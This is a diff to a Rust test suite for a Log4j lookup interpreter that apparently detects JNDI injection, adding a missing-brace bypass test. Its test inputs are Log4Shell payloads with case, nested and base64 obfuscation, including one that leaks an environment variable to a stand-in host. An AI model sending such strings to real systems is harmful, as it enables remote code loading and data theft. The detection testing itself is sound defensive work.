@@ -1,4 +1,4 @@
-use log4j_interpreter::{parse_str, Findings};
+use log4j_interpreter::{parse_str, parse_with_brace_check, Findings};
 
 fn parseu(input: &str) -> (String, Findings) {
     parse_str(input, 3).unwrap()
@@ -63,20 +63,17 @@ fn unicode_obfuscated() {
 fn various_case_rules() {
     // It appears that log4j handles tokens like `LoWeR` and `jNdi`, but not unicode characters
     // that would lowercase to the same thing. Don't know where the matching happens in log4j yet.
-    let (result, findings) =
-        parseu("does this get blocked? ${jndı:ldap://whatever}");
+    let (result, findings) = parseu("does this get blocked? ${jndı:ldap://whatever}");
     assert_eq!("does this get blocked? ", result); // the unknown `jndı` expands to empty string
     assert!(!findings.saw_jndi);
 
     // but regular caps do the trick
-    let (result, findings) =
-        parseu("does this get blocked? ${jndI:ldap://whatever}");
+    let (result, findings) = parseu("does this get blocked? ${jndI:ldap://whatever}");
     assert_eq!("does this get blocked? jndI:ldap://whatever", result);
     assert!(findings.saw_jndi);
 
     // and work in nested evaluations too
-    let (result, findings) =
-        parseu("does this get blocked? ${jnd${UpPeR:i}:ldap://whatever}");
+    let (result, findings) = parseu("does this get blocked? ${jnd${UpPeR:i}:ldap://whatever}");
     assert_eq!("does this get blocked? jndI:ldap://whatever", result);
     assert!(findings.saw_jndi);
 }
@@ -112,10 +109,7 @@ fn base64() {
     let evil = base64::encode("${jndi:ldap:${env:user}.crime.scene/a}");
     let input = format!("all your base64 are ${{base64:{}}}", evil);
     let (result, findings) = parseu(&input);
-    assert_eq!(
-        "all your base64 are jndi:ldap:.crime.scene/a",
-        result
-    );
+    assert_eq!("all your base64 are jndi:ldap:.crime.scene/a", result);
     assert!(findings.saw_jndi);
     assert!(findings.saw_env);
 
@@ -203,4 +197,13 @@ fn env_expansion() {
     assert_eq!("this env var does not exist: evil_jndi", result);
     assert!(!findings.saw_jndi);
     assert!(findings.saw_env);
+}
+#[test]
+fn missing_brace_bypass() {
+    let input = b"${jndi:ldap://evil.town.exfiltrate";
+    let (result, findings) = parse_with_brace_check(input.to_vec(), 5, 5);
+    let result = std::str::from_utf8(&result).unwrap();
+
+    assert!(findings.saw_jndi);
+    assert_eq!("jndi:ldap://evil.town.exfiltrate", result);
 }
